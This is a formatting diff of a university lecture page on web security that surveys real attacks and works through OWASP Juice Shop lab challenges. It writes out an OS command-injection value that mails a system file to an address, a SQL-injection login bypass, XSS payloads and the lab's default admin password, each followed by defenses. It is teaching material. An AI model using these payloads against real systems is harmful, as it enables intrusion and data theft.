@@ -11,6 +11,7 @@ warning: true
 {% include_relative explanation.md %}
 
 ## Table of Contents <!-- omit in toc -->
+
 - [Required & recommended readings and activities](#required--recommended-readings-and-activities)
 - [:scroll: Learning goals](#scroll-learning-goals)
 - [Introduction](#introduction)
@@ -57,7 +58,7 @@ warning: true
 
 ## Required & recommended readings and activities
 
-- Required readings: *none*
+- Required readings: _none_
 - Recommended activities:
   - :headphones: Listen to [this podcast](https://syntax.fm/show/035/keeping-up-with-the-codeashians-dealing-with-our-fast-paced-industry) on how to navigate the fast-paced Web technology industry.
   - :tv: [The Power of the Web Platform](https://github.com/feross/TheAnnoyingSite.com) - a talk by Feross Aboukhadijeh about what annoying things are possible on the web. Entertaining! Be sure to not open the accompanying website while in a quiet space.
@@ -82,11 +83,11 @@ warning: true
 - Describe and implement a number of attacks that can be executed against unsecured code.
 - Implement measures to protect a web application against such attacks.
 
-*Note that cybersecurity is a huge area of work, here at TU Delft we have a special program at the Master level dedicated to cybersecurity. In one lecture we can only give a small glimpse into the issues web developers face when it comes to security issues.*
+_Note that cybersecurity is a huge area of work, here at TU Delft we have a special program at the Master level dedicated to cybersecurity. In one lecture we can only give a small glimpse into the issues web developers face when it comes to security issues._
 
 ## Introduction
 
-Web applications are an attractive target for *attackers* (also known as *malicious users*) for several reasons:
+Web applications are an attractive target for _attackers_ (also known as _malicious users_) for several reasons:
 
 - Web applications are open to attack from **different angles** as they rely on various software systems to run: an attacker can go after the **web server** hosting the web application, the **web browser** displaying the application and the **web application** itself. The **user**, of course, is also a point of attack.
 - Successfully attacking a web application with thousands or millions of users offers a lot of potential gain.
@@ -94,7 +95,7 @@ Web applications are an attractive target for *attackers* (also known as *malici
 
 When developing a web application, it is important to ask yourself **how can it be attacked?** and secure yourself against those attacks. While web applications are relatively easy to develop thanks to the tooling available today, they are difficult to secure as that step requires substantial technological understanding on the part of the developer. Not only that, how to secure an application is also a constantly moving target, as new vulnerabilities are discovered. An obvious first step is to employ the automated tools mentioned above to fix known vulnerabilities.
 
-Large-scale web portals such as Facebook have partially outsourced the finding of security issues to so-called *white hat hackers* - people interested in security issues that earn money from testing companies' defenses and pointing them towards specific security issues. [By 2016, Facebook, for example, had paid out millions in *bug bounties*](https://www.facebook.com/notes/facebook-bug-bounty/facebook-bug-bounty-5-million-paid-in-5-years/1419385021409053/) ([GitHub has reached a similar payment number in 2020](https://github.blog/2020-03-25-six-years-of-the-github-security-bug-bounty-program/)), while [Google paid 36K to a single bug hunter](https://www.cnbc.com/2018/05/26/teenager-wins-36k-from-google-bug-bounty-program.html) once.
+Large-scale web portals such as Facebook have partially outsourced the finding of security issues to so-called _white hat hackers_ - people interested in security issues that earn money from testing companies' defenses and pointing them towards specific security issues. [By 2016, Facebook, for example, had paid out millions in _bug bounties_](https://www.facebook.com/notes/facebook-bug-bounty/facebook-bug-bounty-5-million-paid-in-5-years/1419385021409053/) ([GitHub has reached a similar payment number in 2020](https://github.blog/2020-03-25-six-years-of-the-github-security-bug-bounty-program/)), while [Google paid 36K to a single bug hunter](https://www.cnbc.com/2018/05/26/teenager-wins-36k-from-google-bug-bounty-program.html) once.
 Bug bounty programs are run by, among others, [Facebook](https://www.facebook.com/whitehat), [Google](https://www.google.com/about/appsecurity/reward-program/), [PayPal](https://www.paypal.com/us/webapps/mpp/security-tools/reporting-security-issues), [Quora](https://engineering.quora.com/Security-Bug-Bounty-Program), [Mozilla](https://www.mozilla.org/en-US/security/bug-bounty/) and [Microsoft](https://www.microsoft.com/en-us/msrc/bounty). Even [Stanford University](https://uit.stanford.edu/security/bug-bounty) runs its own bug bounty program.
 
 ## Threat examples
@@ -103,9 +104,9 @@ Before diving into what causes web applications to be vulnerable on a technical 
 
 ### Defacement
 
-Website defacement is an attack against a website that changes the visual appearance of a site. It can be an act of hacktivism (socio-politically motivated), revenge, or simply internet trolling.  
+Website defacement is an attack against a website that changes the visual appearance of a site. It can be an act of hacktivism (socio-politically motivated), revenge, or simply internet trolling.
 
-A famous example here is CERN, [which in 2008 had one of its portals defaced by a Greek hacker group](https://astroengine.com/2008/09/16/greek-hackers-invade-lhc-nothing-much-happens/). This benevolent looking  page:
+A famous example here is CERN, [which in 2008 had one of its portals defaced by a Greek hacker group](https://astroengine.com/2008/09/16/greek-hackers-invade-lhc-nothing-much-happens/). This benevolent looking page:
 
 ![CERN web page](../img/security-cern-1.png)
 
@@ -115,7 +116,7 @@ became this one:
 
 Beside defacement, no damage was done. Despite this, the attack was a cause for concern as the "hacked" web server formed part of the monitoring systems for some of the Large Hadron Collider detector hardware.
 
-Another example is the [2015 defacement attack against Lenovo](https://www.theguardian.com/technology/2015/feb/26/lenovo-website-hacked-and-defaced-by-lizard-squad-in-superfish-protest) (a computer manufacturer). A hacking group going by the name of *Lizard Squad* replaced Lenovo's main website with a slideshow of bored teenagers.
+Another example is the [2015 defacement attack against Lenovo](https://www.theguardian.com/technology/2015/feb/26/lenovo-website-hacked-and-defaced-by-lizard-squad-in-superfish-protest) (a computer manufacturer). A hacking group going by the name of _Lizard Squad_ replaced Lenovo's main website with a slideshow of bored teenagers.
 
 ### Data disclosure
 
@@ -127,7 +128,7 @@ A less well-known example is a [2015 attack against VTech](http://www.computerwo
 
 This threat is the most devastating for organizations that do not have proper backups in place: attackers are deleting data from servers they infiltrate.
 
-Code Spaces ([snapshot of their website in 2014](https://web.archive.org/web/20140219025823/http://www.codespaces.com:80/)) used to be a company providing secure hosting options and project management services for companies. Until the day the [*Murder in the Amazon cloud*](http://www.infoworld.com/article/2608076/data-center/murder-in-the-amazon-cloud.html) happened - the title of the article is not an exaggeration. Code Spaces was built on Amazon Web Services (AWS), one of the major cloud computing platform providers used by many companies due to their reliable service at predictable cost. Services on demand tend to be cheaper and easier to work with than running and maintaining one's own hardware. AWS has an easy to use interface to spin up servers - a Web interface that has (of course) an authentication step built-in :point_down:: 
+Code Spaces ([snapshot of their website in 2014](https://web.archive.org/web/20140219025823/http://www.codespaces.com:80/)) used to be a company providing secure hosting options and project management services for companies. Until the day the [_Murder in the Amazon cloud_](http://www.infoworld.com/article/2608076/data-center/murder-in-the-amazon-cloud.html) happened - the title of the article is not an exaggeration. Code Spaces was built on Amazon Web Services (AWS), one of the major cloud computing platform providers used by many companies due to their reliable service at predictable cost. Services on demand tend to be cheaper and easier to work with than running and maintaining one's own hardware. AWS has an easy to use interface to spin up servers - a Web interface that has (of course) an authentication step built-in :point_down::
 
 ![AWS console](../img/security-aws.png)
 
@@ -141,7 +142,7 @@ Denial of service (DoS) is a disruption attack that makes web applications unava
 
 To showcase this threat we use a 2015 Steam store attack, which is extensively described in a [Steam post](https://store.steampowered.com/news/19852/). A signature of a DoS attack is the abnormal traffic increase - in this case, the Steam store had to deal with a 2000% increase in traffic. Steam had a defense against a DoS attack in place to minimize the impact on Steam's servers; however, the defense (caching rules of additional web caches) was imperfect and incorrectly cached web traffic was shown to authenticated users, which means that some users saw other people's account page.
 
-A variant of a DoS attack is a *Distributed Denial of Service* (DDoS) attack where multiple systems flood a targeted system. Typically, an attacker recruits multiple vulnerable machines (or bots) to join a *Botnet* for DDoS attacks. In 2016, a major DDoS attack was carried out by the [Mirai botnet](https://www.csoonline.com/article/3258748/the-mirai-botnet-explained-how-teen-scammers-and-cctv-cameras-almost-brought-down-the-internet.html), which was composed of a number of IoT devices that were available on the Internet with default passwords.    
+A variant of a DoS attack is a _Distributed Denial of Service_ (DDoS) attack where multiple systems flood a targeted system. Typically, an attacker recruits multiple vulnerable machines (or bots) to join a _Botnet_ for DDoS attacks. In 2016, a major DDoS attack was carried out by the [Mirai botnet](https://www.csoonline.com/article/3258748/the-mirai-botnet-explained-how-teen-scammers-and-cctv-cameras-almost-brought-down-the-internet.html), which was composed of a number of IoT devices that were available on the Internet with default passwords.
 
 ### Unauthorized access
 
@@ -149,41 +150,41 @@ The most difficult component of a system to secure is its users. **Phishing** an
 
 A common example (also described in this [attack on the US State Department](https://edition.cnn.com/2015/04/07/politics/how-russians-hacked-the-wh/)) is the sending of emails to government employees impersonating a colleague and requesting access to a low-level security system. Who-knows-whom can often be inferred from public appearances, the staff overview on websites, public documents, and so on. Often, access is granted by the unsuspecting user, despite policies to the contrary. Recently, the [University of Maastricht paid out 30 bitcoin (about 200,000 Euros) in ransom](https://www.reuters.com/article/us-cybercrime-netherlands-university-idUSKBN1ZZ2HH) to regain access to their computer systems which had been infiltrated by attackers via phishing.
 
-Unauthorized access can also be achieved by probing web applications for functionalities that should not be accessible to the average user. An example is [Instagram's backend admin panel](https://www.hackread.com/instagram-hacked-researcher-gets-admin-panel-access/) which was accessible on the web while it should have only been accessible from the internal Instagram network.  
+Unauthorized access can also be achieved by probing web applications for functionalities that should not be accessible to the average user. An example is [Instagram's backend admin panel](https://www.hackread.com/instagram-hacked-researcher-gets-admin-panel-access/) which was accessible on the web while it should have only been accessible from the internal Instagram network.
 
-The npm registry has its share of *typosquatting attacks* (e.g. [here](https://securityreport.com/nodejs-malware-caught-exfiltrating-ips-username-and-device-information-on-github/), [here](https://thenewstack.io/npm-cleans-typosquatting-malware/) and [here](https://threatpost.com/attackers-use-typo-squatting-to-steal-npm-credentials/127235/)): malicious users upload packages to the npm registry with names that are typos of popular repository names (e.g. `electorn` instead of `electron`). If an unsuspecting developer is not careful and types `npm install electorn` instead of the wanted `npm install electron`, and starts up a Node.js script with this package included, undesired code is executed. In the case of [`electorn`](https://www.npmjs.com/package/electorn), npm's security team has removed the malicious code from the registry but maintained a placeholder.
+The npm registry has its share of _typosquatting attacks_ (e.g. [here](https://securityreport.com/nodejs-malware-caught-exfiltrating-ips-username-and-device-information-on-github/), [here](https://thenewstack.io/npm-cleans-typosquatting-malware/) and [here](https://threatpost.com/attackers-use-typo-squatting-to-steal-npm-credentials/127235/)): malicious users upload packages to the npm registry with names that are typos of popular repository names (e.g. `electorn` instead of `electron`). If an unsuspecting developer is not careful and types `npm install electorn` instead of the wanted `npm install electron`, and starts up a Node.js script with this package included, undesired code is executed. In the case of [`electorn`](https://www.npmjs.com/package/electorn), npm's security team has removed the malicious code from the registry but maintained a placeholder.
 
 ## Most frequent vulnerabilities
 
-In order to effectively secure a web application, it helps to know what the most frequent security issues are. 
+In order to effectively secure a web application, it helps to know what the most frequent security issues are.
 
-Ideally, we can refer to a single report, that is updated yearly and showcases the most frequent vulnerabilities derived from a large sample of web applications. Unfortunately, due to the big business that *cybersecurity* is, many existing reports read more like an advertisement and are vague on their methodology, where the numbers come from, how the vulnerabilities were derived and so on. For this reason, we here mostly rely on the [Cyber security risk report 2016 published by HPE](https://www.thehaguesecuritydelta.com/media/com_hsd/report/57/document/4aa6-3786enw.pdf) (in short: CSRHPE). For this report, several thousand applications (mobile, web, desktop) were sampled and their security was probed. Although the report is from 2016, the major findings have been corroborated by more recent reports as well (such as the [2019 vulnerability statistics report](https://www.edgescan.com/wp-content/uploads/2019/02/edgescan-Vulnerability-Stats-Report-2019.pdf) and the [2019 Internet Security Threat Report](https://www.symantec.com/content/dam/symantec/docs/reports/istr-24-2019-en.pdf)). In this section of the lecture, we go over some of the most important findings in the CSRHPE concerning web applications.
+Ideally, we can refer to a single report, that is updated yearly and showcases the most frequent vulnerabilities derived from a large sample of web applications. Unfortunately, due to the big business that _cybersecurity_ is, many existing reports read more like an advertisement and are vague on their methodology, where the numbers come from, how the vulnerabilities were derived and so on. For this reason, we here mostly rely on the [Cyber security risk report 2016 published by HPE](https://www.thehaguesecuritydelta.com/media/com_hsd/report/57/document/4aa6-3786enw.pdf) (in short: CSRHPE). For this report, several thousand applications (mobile, web, desktop) were sampled and their security was probed. Although the report is from 2016, the major findings have been corroborated by more recent reports as well (such as the [2019 vulnerability statistics report](https://www.edgescan.com/wp-content/uploads/2019/02/edgescan-Vulnerability-Stats-Report-2019.pdf) and the [2019 Internet Security Threat Report](https://www.symantec.com/content/dam/symantec/docs/reports/istr-24-2019-en.pdf)). In this section of the lecture, we go over some of the most important findings in the CSRHPE concerning web applications.
 
-The most important **software security issues** for web and mobile applications are the following, reported as *percentage of scanned applications*:
+The most important **software security issues** for web and mobile applications are the following, reported as _percentage of scanned applications_:
 
 ![Web and mobile security](../img/security-security-report-1.png)
 
 <sup>Most important software security issues. Figure taken from page 56, CSRHPE.</sup>
 
-:point_up: In general, mobile applications are more vulnerable than web applications; the worst issues were found in the *security features* category, which includes authentication, access control, confidentiality and cryptography issues. 99% of mobile applications had at least one issue here. The *environment* category is also problematic with 77% of web applications and 88% of mobile applications having an issue here - this refers to server misconfigurations, improper file settings, sample files and outdated software versions. The third category to mention is *input validation and representation* which covers issues such as cross-site scripting and SQL injections, that are present in most mobile applications and 44% of web applications. The latter is actually surprising, as a lot of best practices of how to secure web applications exist - clearly though, these recommendations are often ignored.
+:point_up: In general, mobile applications are more vulnerable than web applications; the worst issues were found in the _security features_ category, which includes authentication, access control, confidentiality and cryptography issues. 99% of mobile applications had at least one issue here. The _environment_ category is also problematic with 77% of web applications and 88% of mobile applications having an issue here - this refers to server misconfigurations, improper file settings, sample files and outdated software versions. The third category to mention is _input validation and representation_ which covers issues such as cross-site scripting and SQL injections, that are present in most mobile applications and 44% of web applications. The latter is actually surprising, as a lot of best practices of how to secure web applications exist - clearly though, these recommendations are often ignored.
 
-If we zoom in on the non-mobile applications, the ten most commonly occurring vulnerabilities are the following, reported as the *percentage of applications* and *median vulnerability count*:
+If we zoom in on the non-mobile applications, the ten most commonly occurring vulnerabilities are the following, reported as the _percentage of applications_ and _median vulnerability count_:
 
 ![Top 10 vulnerabilities](../img/security-security-report-2.png)
 
 <sup>Top 10 vulnerabilities. Figure taken from page 57, CSRHPE.</sup>
 
-:point_up: Some of these vulnerabilities you should already recognize and be able to place in context, specifically *Cookie Security: cookie not sent over SSL* and *Cookie Security: HTTPOnly not set*. The vulnerability *Privacy violation: autocomplete* should intuitively make sense: auto-completion is a feature provided by modern browsers; browsers store information submitted by the user through `<input>` fields. The browser can then offer autocompletion for subsequent forms with similar field names. If sensitive information is stored in this manner, a malicious actor can provide a form to a user that is then auto-filled with sensitive values and transmitted back to the attacker. For this reason, it is often worthwhile to [switch off autocompletion](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion) for sensitive input fields.
+:point_up: Some of these vulnerabilities you should already recognize and be able to place in context, specifically _Cookie Security: cookie not sent over SSL_ and _Cookie Security: HTTPOnly not set_. The vulnerability _Privacy violation: autocomplete_ should intuitively make sense: auto-completion is a feature provided by modern browsers; browsers store information submitted by the user through `<input>` fields. The browser can then offer autocompletion for subsequent forms with similar field names. If sensitive information is stored in this manner, a malicious actor can provide a form to a user that is then auto-filled with sensitive values and transmitted back to the attacker. For this reason, it is often worthwhile to [switch off autocompletion](https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion) for sensitive input fields.
 
-:point_up: Lastly, let's discuss the *Hidden field* vulnerability. It provides developers with a simple manner of including data that should not be seen/modified by users when a `<form>` is submitted. For example, a web portal may offer the same form on every single web page and the hidden field stores a numerical identifier of the specific page (or route) the form was submitted from. However, as with any data sent to the browser, with a bit of knowledge about the dev tools available in modern browsers, the user can easily change the hidden field values, which creates a vulnerability if the server does not validate the correctness of the returned value.
+:point_up: Lastly, let's discuss the _Hidden field_ vulnerability. It provides developers with a simple manner of including data that should not be seen/modified by users when a `<form>` is submitted. For example, a web portal may offer the same form on every single web page and the hidden field stores a numerical identifier of the specific page (or route) the form was submitted from. However, as with any data sent to the browser, with a bit of knowledge about the dev tools available in modern browsers, the user can easily change the hidden field values, which creates a vulnerability if the server does not validate the correctness of the returned value.
 
-Taking a slightly higher-level view, the top five violated security categories across all scanned applications are the following, reported as *percentage of applications violating a category* :point_down::
+Taking a slightly higher-level view, the top five violated security categories across all scanned applications are the following, reported as _percentage of applications violating a category_ :point_down::
 
 ![Top 5 violated security categories](../img/security-security-report-3.png)
 
 <sup>Top 5 violated security categories. Figure taken from page 59, CSRHPE.</sup>
 
-:point_up: The only category not covered so far is *Insecure transport*. This refers to the fact that applications rely on insecure communication channels or weakly secured channels to transfer sensitive data. Nowadays, at least for login/password fields, the modern browsers provide a warning to the user indicating the non-secure nature of the connection, as seen in this example :point_down::
+:point_up: The only category not covered so far is _Insecure transport_. This refers to the fact that applications rely on insecure communication channels or weakly secured channels to transfer sensitive data. Nowadays, at least for login/password fields, the modern browsers provide a warning to the user indicating the non-secure nature of the connection, as seen in this example :point_down::
 
 ![Juice Shop not secure](../img/security-browser-warning-juiceshop.png)
 
@@ -208,7 +209,7 @@ sort of man-in-the-middle attack.
 
 The best way to learn about web security is to try out the introduced techniques in an actual web application that is vulnerable. As we have covered JavaScript/Node.js, a vulnerable web application that is written in JavaScript/Node.js will be most useful to us.
 
-The [OWASP Juice Shop application](https://owasp.org/www-project-juice-shop/) was designed specifically for this purpose. It is an insecure web application written in JavaScript (using Node.js/Express/Angular) that contains a wide range of vulnerabilities. 
+The [OWASP Juice Shop application](https://owasp.org/www-project-juice-shop/) was designed specifically for this purpose. It is an insecure web application written in JavaScript (using Node.js/Express/Angular) that contains a wide range of vulnerabilities.
 
 :bangbang: [Juice Shop's GitHub repository](https://github.com/bkimminich/juice-shop) comes with detailed installation instructions that allow you to install it locally on your machine or in the cloud. We strongly suggest you to do so, and to follow the practical guide we provide in the next sections. More specifically, we suggest to use the [Docker container setup](https://github.com/bkimminich/juice-shop#docker-container) - if you need help installing Docker or Juice Shop, please ask the student assistants during lab hours!
 
@@ -236,10 +237,10 @@ Injection attacks on the server can take multiple forms, we first consider **OS 
 
 <sup>OS command injection.</sup>
 
-:point_up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (*Thank you for signing up for our mailing list.*). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
+:point_up: Here, we have a web portal that allows a user to sign up to a newsletter. The form looks simple enough: one `<input type="text">` element and a `<button>` to submit the form. On the server-side, a bash script takes a fixed confirmation string (stored in file `confirm`) and sends an email to the email address as stated in the user's input (_Thank you for signing up for our mailing list._). This setup of course assumes, that the user actually used an email address as input. Let's look at benign and malicious user input:
 
 - The benign input `john@test.nl` leads to the following OS command: `cat confirm|mail john@test.nl`. This command line is indeed sufficient to send an email, as Linux has a command line [mail](https://linux.die.net/man/1/mail) tool.
-- An example of malicious input is the following: `john@test.nl; cat /etc/password | mail john@test.nl`. If the input is not checked, the server-side command line will look as follows: `cat confirm | mail john@test.nl; cat /etc/password | mail john@test.nl`. Now, two emails are sent: the confirmation email and a mail sending the server's file `/etc/password` to `john@test.nl`. This is clearly *unintended code execution*.
+- An example of malicious input is the following: `john@test.nl; cat /etc/password | mail john@test.nl`. If the input is not checked, the server-side command line will look as follows: `cat confirm | mail john@test.nl; cat /etc/password | mail john@test.nl`. Now, two emails are sent: the confirmation email and a mail sending the server's file `/etc/password` to `john@test.nl`. This is clearly _unintended code execution_.
 
 The main issue here is the lack of **input validation**. It should not be assumed that any input is the desired/wanted input, this has to be validated.
 
@@ -270,25 +271,34 @@ We here take up the **Login Bender** attack among all available [Juice Shop inje
 1. To execute, head to your local Juice Shop installation. If you followed our suggestion of using the Docker setup, your local installation will be at [http://localhost:3000](http://localhost:3000).
 2. Head to the login screen via the Account link at the top right.
 3. If we know that `Bender` is a user, we now need to guess that user's email address. If our guess is correct, we can then see what happens if we append `'--` to the email address. If the application is susceptible to a SQL injection attack, we should be able to login with Bender's email address and any password of our choosing.
-4. With a little bit of guessing, we will end up at `bender@juice-sh.op` as the email address of user `Bender`. See if you can log in with that email address and any password of your choosing. *This should not be possible. You should receive an error message.*
+4. With a little bit of guessing, we will end up at `bender@juice-sh.op` as the email address of user `Bender`. See if you can log in with that email address and any password of your choosing. _This should not be possible. You should receive an error message._
 5. Now try the same email address with our little SQL injection suffix `'--`: `bender@juice-sh.op'--`. No matter the provided password, you should be able to log in as user `Bender`.
 
 Why does this work? Lets take a look at the source code of Juice Shop, in particular the [login route](https://github.com/bkimminich/juice-shop/blob/master/routes/login.js). It contains the following code snippet :point_down::
 
 ```javascript
-module.exports = function login () {
+module.exports = function login() {
   /* ... */
 
   return (req, res, next) => {
     /* ... */
-    models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${insecurity.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true })
+    models.sequelize
+      .query(
+        `SELECT * FROM Users WHERE email = '${
+          req.body.email || ""
+        }' AND password = '${insecurity.hash(
+          req.body.password || ""
+        )}' AND deletedAt IS NULL`,
+        { model: models.User, plain: true }
+      )
       .then((authenticatedUser) => {
         /* ... */
-      }).catch(error => {
-        next(error)
       })
-  }
-}
+      .catch((error) => {
+        next(error);
+      });
+  };
+};
 /* ... */
 ```
 
@@ -301,20 +311,19 @@ Injection attacks can be avoided by **validating** user input (e.g., is this inp
 A popular Node package that validates and sanitizes user input is [validator](https://www.npmjs.com/package/validator). For example, to check whether a user input constitutes a valid email address, the following two lines of code are sufficient:
 
 ```javascript
-var validator = require('validator');
-var isEmail = validator.isEmail('while(1)'); //false
+var validator = require("validator");
+var isEmail = validator.isEmail("while(1)"); //false
 ```
 
 To avoid SQL injection attacks, [sqlstring](https://www.npmjs.com/package/sqlstring) is a Node.js package that escapes user provided input. Even better, instead of writing SQL queries on the fly (so-called dynamic queries as shown above), use **prepared statements** as [described here for PostgreSQL](https://www.postgresql.org/docs/current/sql-prepare.html).
 
-
 ### Broken authentication and session management
 
-Quoting OWASP: *"Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently."*.
+Quoting OWASP: _"Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently."_.
 
 We here focus in particular on technical weaknesses, though phishing and other social techniques are often employed to guess passwords and answers to security questions (which in turn allow password resets).
 
-[Recall](https://chauff.github.io/Web-Teaching/sessions/#bangbang-sessions) that in order to establish *sessions*, cookies are used. A cookie stores a randomly generated user ID on the client, the remaining user information is stored on the server :point_down::
+[Recall](https://chauff.github.io/Web-Teaching/sessions/#bangbang-sessions) that in order to establish _sessions_, cookies are used. A cookie stores a randomly generated user ID on the client, the remaining user information is stored on the server :point_down::
 
 ![Session](../img/sessions-sessions.png)
 
@@ -328,7 +337,7 @@ An attacker can exploit broken authentication and session management functions t
 
 #### :bangbang: Juice Shop
 
-Juice Shop's [broken authentication challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/broken-authentication.html) involve a considerable number of web searches to find information about its *users*. They also showcase the issue of weak and default passwords. We here take up the challenge of logging in with the administrator's user credentials without applying an SQL injection. This boils down to guessing the admin's username and password. This is not a completely random exercise, as there default credentials available that are often left unchanged by administrators. Even if not the default, often usernames are guessable and passwords are weak. In the case of Juice Shop, the admin email address is `admin@juice-sh.op` and the login is `admin123`. The very popular GitHub repo [SecLists](https://github.com/danielmiessler/SecLists) contains among others collections of common usernames and common passwords to aid *penetration testers* (i.e. testers evaluating the security of applications) in their work. If an application does not control the maximum number of input attempts in a certain time window (Juice Shop indeed does not), an automated script could be employed to run through all common username/password combinations until a valid username/password combination is found.
+Juice Shop's [broken authentication challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/broken-authentication.html) involve a considerable number of web searches to find information about its _users_. They also showcase the issue of weak and default passwords. We here take up the challenge of logging in with the administrator's user credentials without applying an SQL injection. This boils down to guessing the admin's username and password. This is not a completely random exercise, as there default credentials available that are often left unchanged by administrators. Even if not the default, often usernames are guessable and passwords are weak. In the case of Juice Shop, the admin email address is `admin@juice-sh.op` and the login is `admin123`. The very popular GitHub repo [SecLists](https://github.com/danielmiessler/SecLists) contains among others collections of common usernames and common passwords to aid _penetration testers_ (i.e. testers evaluating the security of applications) in their work. If an application does not control the maximum number of input attempts in a certain time window (Juice Shop indeed does not), an automated script could be employed to run through all common username/password combinations until a valid username/password combination is found.
 
 #### How to avoid it
 
@@ -347,7 +356,7 @@ Juice Shop's [broken authentication challenges](https://bkimminich.gitbooks.io/p
 
 XSS stands for **cross-site scripting**.
 
-*"XSS flaws occur when an application includes user supplied data in a page sent to the browser without properly validating or escaping that content."* (OWASP)
+_"XSS flaws occur when an application includes user supplied data in a page sent to the browser without properly validating or escaping that content."_ (OWASP)
 
 The browser executes JavaScript code all the time; this code is **not** checked by anti-virus software. The browser's sandbox is the main line of defense.
 
@@ -362,7 +371,7 @@ http://myforum.nl/add_comment?c=Let+me+…
 http://myforum.nl/add_comment?c=<script>…
 ```
 
-In a **reflected XSS** attack (also known as **non-persistent or Type-II** attack), the injected script is not stored on the server; instead, it is *reflected* off the target server. A victim may for instance receive an email with a tainted link that contains malicious URL parameters.
+In a **reflected XSS** attack (also known as **non-persistent or Type-II** attack), the injected script is not stored on the server; instead, it is _reflected_ off the target server. A victim may for instance receive an email with a tainted link that contains malicious URL parameters.
 
 In the example :point_down: the tainted URL contains JavaScript code as query. An unsuspecting user (the victim) may receive this URL in an email and trust it, because she trusts http://myforum.nl. The malicious code is reflected off the server and ends up in the victim's browser, which executes it.
 
@@ -375,11 +384,11 @@ http://myforum.nl/search?q=<script>…
 
 Among [Juice Shop's XSS challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/xss.html) we take a look at a reflected XSS attack.
 
-Head to your Juice Shop installation and look for the search bar. Try to search for different things (`juice`, `apple`, `pear`). You will see that the original query `XX` is always shown at the top of the search results as `Search Results - XX`. Let's see whether the search result input is sufficiently sanitized or whether it allows us to perform a reflected XSS attack. 
+Head to your Juice Shop installation and look for the search bar. Try to search for different things (`juice`, `apple`, `pear`). You will see that the original query `XX` is always shown at the top of the search results as `Search Results - XX`. Let's see whether the search result input is sufficiently sanitized or whether it allows us to perform a reflected XSS attack.
 
-- Try to search for `alert('hello?')` - what happens? Does an alert window pop up? <span class="spoiler">No. Basic input sanitation is happening.</span>
-- What about `<IMG SRC=javascript:alert('hello?');>`? <span class="spoiler">Besides a little broken image icon not much is happening.</span>
-- How about `<iframe src=javascript:alert('hello?');></iframe>`? <span class="spoiler">This attack is successful, you should see a little popup! Take a look at the URL - it is not obvious that this will lead to some JavaScript execution to the untrained eye (not to mention that when posted to services such as Twitter or Facebook the URL will be shortened and unrecognizable).</span>
+- Try to search for `alert('hello?')` - what happens? Does an alert window pop up? <spoiler-info>No. Basic input sanitation is happening.</spoiler-info>
+- What about `<IMG SRC=javascript:alert('hello?');>`? <spoiler-info>Besides a little broken image icon not much is happening.</spoiler-info>
+- How about `<iframe src=javascript:alert('hello?');></iframe>`? <spoiler-info>This attack is successful, you should see a little popup! Take a look at the URL - it is not obvious that this will lead to some JavaScript execution to the untrained eye (not to mention that when posted to services such as Twitter or Facebook the URL will be shortened and unrecognizable).</spoiler-info>
 
 Of course, such a popup does not really look malicious, in the end we just say hello. However, a malicious user will probably put other things beside a benign popup into the `<iframe>`.
 
@@ -388,15 +397,16 @@ Of course, such a popup does not really look malicious, in the end we just say h
 As before, **validation** of user input is vital. Importantly, input validation has to occur on the client **and** server-side. A malicious user can bypass client-side validation by using a tool like `curl` to create HTTP requests instead of using the browser or by manipulating the requests inside the browser. Thus, client-side validation only helps actual users of the application, it offers no defense against an XSS attack.
 
 A server that generates output based on user data should **escape** it (e.g., escaping `<script>` leads to `&lt;script&gt;`), so that the browser does not execute it.
-[DOMPurify](https://www.npmjs.com/package/dompurify) is a good tool for sanitizing HTML code and therefore you can use it to protect your web application from XSS attacks. 
+[DOMPurify](https://www.npmjs.com/package/dompurify) is a good tool for sanitizing HTML code and therefore you can use it to protect your web application from XSS attacks.
 
 Here is a code example of DOMPurify :point_down::
+
 ```javascript
 let dirty = '<script> alert("I am dangerous"); </script> Hi';
 let clean = DOMPurify.sanitize(dirty);
 ```
 
-After execution, the variable `clean` will contain only **"Hi"**, DOMPurify will remove the `<script>` tag to prevent an XSS attack. 
+After execution, the variable `clean` will contain only **"Hi"**, DOMPurify will remove the `<script>` tag to prevent an XSS attack.
 
 We have shown here only a small sample of input that is usually employed to evaluate an application's XSS defenses. An elaborate list of inputs that need to be included in any such testing can be found [at OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet).
 
@@ -436,7 +446,7 @@ Install the latest stable version of Node.js and Express. Install security updat
 
 [RetireJS](https://github.com/RetireJS/retire.js) is another tool to detect outdated JavaScript libraries. It does not fix anything but lists vulnerabilities with greater detail than `npm audit`.
 
-A popular package to secure Express-based applications is [Helmet](https://www.npmjs.com/package/helmet). It acts as middleware in Express applications and sets HTTP headers according to best security practices. 
+A popular package to secure Express-based applications is [Helmet](https://www.npmjs.com/package/helmet). It acts as middleware in Express applications and sets HTTP headers according to best security practices.
 
 Rely on automated scanner tools to check web servers for the most common types of security misconfigurations.
 
@@ -446,15 +456,15 @@ If a web application does not use HTTPS for all authenticated routes (recall tha
 
 If a web application relies on outdated encryption strategies to secure sensitive data, it is just a matter of time until the encryption is broken.
 
-In addition, if sensitive documents can be accessed without authorization a  malicious user can run scans of likely end points that are not secured.
+In addition, if sensitive documents can be accessed without authorization a malicious user can run scans of likely end points that are not secured.
 
 #### :bangbang: Juice Shop
 
-Of the [sensitive data exposure challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/sensitive-data-exposure.html) we here cover the *Confidential Document* task which is simple: access a confidential document.
+Of the [sensitive data exposure challenges](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/sensitive-data-exposure.html) we here cover the _Confidential Document_ task which is simple: access a confidential document.
 
